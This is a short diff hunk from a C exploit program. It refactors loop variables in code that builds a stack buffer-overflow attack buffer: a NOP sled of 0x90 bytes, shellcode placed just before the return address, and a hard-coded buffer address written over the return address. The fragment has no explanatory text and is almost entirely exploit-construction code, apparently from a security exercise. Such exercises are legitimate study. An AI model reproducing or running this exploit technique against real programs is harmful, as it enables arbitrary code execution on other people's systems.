@@ -16,11 +16,12 @@ main ( int argc, char * argv[] )
 {
 	char *	args[3];
 	char *	env[1];
+	int i;
 	unsigned char attack_buffer[BUF_SIZE];
 	
-	for (int i = 0; i < BUF_TO_RET - SHELL_SIZE; i++)
+	for (i = 0; i < BUF_TO_RET - SHELL_SIZE; i++)
 		attack_buffer[i] = 0x90;
-	for (int i = 0; i < SHELL_SIZE; i++)
+	for (i = 0; i < SHELL_SIZE; i++)
 		attack_buffer[BUF_TO_RET - SHELL_SIZE + i] = shellcode[i];
 	
 	attack_buffer[BUF_TO_RET] = (char) ((BUF_ADDR & 0xFF000000) >> 24);
